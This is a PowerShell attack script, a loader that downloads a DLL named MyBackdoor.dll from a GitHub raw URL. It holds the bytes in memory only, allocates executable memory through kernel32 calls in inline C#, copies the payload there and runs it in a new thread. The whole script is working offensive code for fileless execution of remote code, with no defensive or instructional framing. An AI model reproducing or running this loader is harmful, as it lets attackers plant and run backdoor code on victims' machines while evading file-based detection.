# loader.ps1
if ([Environment]::Is64BitProcess) {
    Write-Host "[*] Running in 64-bit PowerShell"
} else {
    Write-Host "[!] Running in 32-bit PowerShell"
}

Write-Host "[*] Running under:" `
           + (Get-Host).Version `
           + " / " + $PSVersionTable.PSEdition
Write-Host "[*] Is64BitProcess = $([Environment]::Is64BitProcess)"

# 1) Download the DLL bytes
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[*] Downloading payload from $payloadUrl"
$dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 2) Define the real reflective loader, compiled for x64
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class ReflectiveLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle, uint dwMilliseconds);

    public static void LoadAndRun(byte[] rawAssembly) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length, 0x3000, 0x40);
        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@ -Language CSharp -CompilerOptions "/platform:x64"

# 3) Invoke it
Write-Host "[*] Reflectively loading payload.dll into memory"
[ReflectiveLoader]::LoadAndRun($dllBytes)
